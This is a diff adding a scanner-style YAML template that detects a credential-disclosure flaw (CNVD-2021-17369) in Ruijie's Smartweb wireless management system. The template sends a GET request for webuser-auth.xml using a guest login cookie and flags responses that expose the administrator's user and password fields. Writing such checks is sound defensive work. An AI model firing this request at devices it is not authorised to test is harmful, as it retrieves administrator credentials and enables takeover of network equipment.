@@ -1,0 +1,29 @@
+id: CNVD-2021-17369
+brief:
+    title: Ruijie Smartweb Management System Password Information Disclosure
+    by: pikpikcu
+    level: high
+    about: The wireless smartweb management system of Ruijie Networks Co., Ltd. has a logic flaw. An attacker can obtain the administrator account and password from a low-privileged user, thereby escalating t...
+    label:
+        - cnvd2021
+        - cnvd
+        - ruijie
+        - disclosure
+        - vuln
+    score: CVSS:8.3
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/web/xml/webuser-auth.xml'
+      head:
+        Cookie: login=1; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
+      signs:
+        - "on": word
+          has:
+            - <userauth>
+            - <password>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
